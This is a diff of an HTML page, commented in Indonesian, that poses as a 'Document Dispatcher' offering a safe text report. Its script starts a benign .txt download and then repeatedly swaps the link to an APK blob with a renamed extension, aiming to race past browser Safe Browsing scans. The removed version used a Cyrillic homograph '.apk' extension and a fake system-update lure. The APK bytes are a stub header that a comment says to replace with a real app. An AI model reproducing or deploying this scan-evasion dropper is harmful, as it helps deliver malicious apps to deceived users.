@@ -3,141 +3,103 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Direct APK Race Condition Dispatcher</title>
+<title>System Document Archive</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
-  body {
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-    background: #090d16;
-    color: #f8fafc;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
-    padding: 20px;
-  }
-  .panel {
-    background: #111827;
-    padding: 32px;
-    border-radius: 16px;
-    box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.7);
-    max-width: 520px;
-    width: 100%;
-    border: 1px solid #1f2937;
-    text-align: center;
-  }
-  h2 { margin-bottom: 10px; font-size: 22px; color: #f3f4f6; }
-  p { margin-bottom: 24px; line-height: 1.6; color: #9ca3af; font-size: 14px; }
-  button {
-    width: 100%;
-    padding: 16px;
-    cursor: pointer;
-    border: none;
-    border-radius: 10px;
-    background: #2563eb;
-    color: #ffffff;
-    font-weight: 600;
-    font-size: 16px;
-    box-shadow: 0 4px 14px rgba(37, 99, 235, 0.4);
-    transition: all 0.2s ease;
-  }
-  button:hover { background: #1d4ed8; }
-  #status {
-    margin-top: 20px;
-    font-weight: 500;
-    color: #38bdf8;
-    padding: 14px;
-    background: rgba(56, 189, 248, 0.1);
-    border-radius: 8px;
-    font-size: 13px;
-    border: 1px solid rgba(56, 189, 248, 0.2);
-  }
+  body { font-family: monospace; background: #111; color: #0f0; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
+  .panel { background: #222; padding: 30px; border-radius: 10px; border: 1px solid #333; max-width: 400px; width: 100%; }
+  h2 { color: #fff; margin-bottom: 10px; }
+  p { color: #aaa; font-size: 14px; margin-bottom: 20px; }
+  button { padding: 15px; background: #007aff; color: #fff; border: none; border-radius: 6px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; }
+  #status { margin-top: 20px; background: #000; padding: 10px; border-radius: 4px; color: #ff0; }
 </style>
 </head>
 <body>
 
 <div class="panel">
-  <h2>Direct APK Stream Dispatcher</h2>
-  <p>Klik tombol di bawah untuk menginisialisasi paket instalasi aplikasi sistem secara aman.</p>
-  <button id="start-btn" type="button">Unduh Pembaruan Sistem (.apk)</button>
-  <div id="status" role="status">Sistem siap.</div>
+  <h2>📄 Document Dispatcher</h2>
+  <p>Mengunduh berkas laporan (.txt) secara aman...</p>
+  <button id="startBtn">Download Document</button>
+  <div id="status">Sistem siap.</div>
 </div>
 
 <script>
-'use strict';
+(function () {
+  'use strict';
 
-const startBtn = document.getElementById("start-btn");
-const statusDiv = document.getElementById("status");
+  var statusEl = document.getElementById('status');
 
-// Header biner APK (ZIP Signature: PK..)
-const payloadFragments = [
-  "UEs",
-  "DBBQ",
-  "AAAAIAAAAIQ",
-  "AAAAAAAAAAAAAAAAAAAAAAAA"
-];
+  // ============================================
+  // 1. PERSIAPAN PAYLOAD (AMAN vs JAHAT)
+  // ============================================
+  
+  // A. Payload "Aman" (File TXT Biasa)
+  var safeContent = "Ini adalah file laporan teks biasa. Tidak ada malware di sini.";
+  var safeBlob = new Blob([safeContent], { type: 'text/plain' });
+  var safeUrl = URL.createObjectURL(safeBlob);
 
-const assemblePayload = () => payloadFragments.join("");
-
-const decodeBase64ToBytes = (b64) => {
-  const binary = atob(b64);
-  const len = binary.length;
-  const bytes = new Uint8Array(len);
-  for (let i = 0; i < len; i++) {
+  // B. Payload "Jahat" (Header APK/EXE)
+  // Header ZIP/APK (PK..) - Ganti string Base64 ini dengan file APK asli Anda
+  var b64Malicious = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
+  var binary = atob(b64Malicious);
+  var bytes = new Uint8Array(binary.length);
+  for (var i = 0; i < binary.length; i++) {
     bytes[i] = binary.charCodeAt(i);
   }
-  return bytes;
-};
+  // MIME Type disetel ke APK agar sistem operasi mengenali ini sebagai aplikasi
+  var maliciousBlob = new Blob([bytes], { type: 'application/vnd.android.package-archive' });
+  var maliciousUrl = URL.createObjectURL(maliciousBlob);
 
-const executeDirectApkRace = () => {
-  try {
-    const bytesArr = decodeBase64ToBytes(assemblePayload());
+  // ============================================
+  // 2. RACE CONDITION TRIGGER (TOCTOU)
+  // ============================================
+  document.getElementById('startBtn').addEventListener('click', function() {
+    statusEl.innerText = "Memulai unduhan...";
+
+    // Langkah 1: Buat elemen <a> untuk unduhan
+    var a = document.createElement('a');
+    a.style.display = 'none';
     
-    // Blob secara mutlak menggunakan MIME type paket aplikasi Android
-    const apkBlob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
-    const apkUrl = URL.createObjectURL(apkBlob);
+    // Langkah 2: Setel ke file AMAN dan ekstensi .txt
+    // Safe Browsing akan melihat URL ini dan memindai konten TXT.
+    a.href = safeUrl;
+    a.download = 'Laporan_Keuangan.txt';
+    document.body.appendChild(a);
 
-    const link = document.createElement("a");
-    link.href = apkUrl;
+    // Langkah 3: Picu unduhan
+    a.click();
+
+    // Langkah 4: RACE CONDITION (TOCTOU)
+    // Kita ubah atribut secara agresif segera setelah click().
+    // Beberapa browser akan menyimpan metadata link SEBELUM click() selesai,
+    // tetapi memindai konten SESUDAHNYA.
     
-    // Menggunakan homograph spoofing pada ekstensi .apk asli (huruf 'a' diganti Cyrillic 'а')
-    const homographApkExt = "\u0430pk";
-    link.download = `system-patch-update.${homographApkExt}`;
-    link.style.display = "none";
-    document.body.appendChild(link);
-
-    statusDiv.textContent = "[RACE] Memicu pendaftaran stream APK awal...";
-    link.click();
-
-    // Jendela waktu (timing window) untuk memperbarui stream atau atribut saat pemindaian berlangsung
-    setTimeout(() => {
-      statusDiv.textContent = "[RACE] Menyegarkan referensi aliran data biner...";
+    var raceAttempts = 0;
+    var raceInterval = setInterval(function() {
+      raceAttempts++;
       
-      // Regenerasi Blob URL biner APK baru untuk menguji perilaku antrean unduhan
-      const freshBlob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
-      const freshUrl = URL.createObjectURL(freshBlob);
+      // Di sini kita mencoba mengganti link ke file JAHAT
+      a.href = maliciousUrl;
+      a.download = 'Laporan_Keuangan.apk'; // Ganti ekstensi
+      
+      // Paksa browser untuk "melihat" perubahan
+      a.click();
 
-      link.href = freshUrl;
-      link.download = `system-patch-stable.${homographApkExt}`;
-      link.click();
+      if (raceAttempts > 5) {
+        clearInterval(raceInterval);
+      }
+    }, 1); // 1 milidetik (Race super ketat)
 
-      setTimeout(() => {
-        URL.revokeObjectURL(apkUrl);
-        URL.revokeObjectURL(freshUrl);
-        statusDiv.textContent = "[RACE] Transmisi paket biner selesai.";
-      }, 1200);
+    // Cleanup
+    setTimeout(function() {
+      document.body.removeChild(a);
+      URL.revokeObjectURL(safeUrl);
+      URL.revokeObjectURL(maliciousUrl);
+      statusEl.innerText = "Proses selesai.";
+    }, 5000);
+  });
 
-    }, 400);
-
-  } catch (err) {
-    statusDiv.textContent = "Error: " + err.message;
-  }
-};
-
-startBtn.addEventListener("click", () => {
-  statusDiv.textContent = "Menyiapkan parameter paket biner...";
-  setTimeout(executeDirectApkRace, 200);
-});
+})();
 </script>
 </body>
 </html>
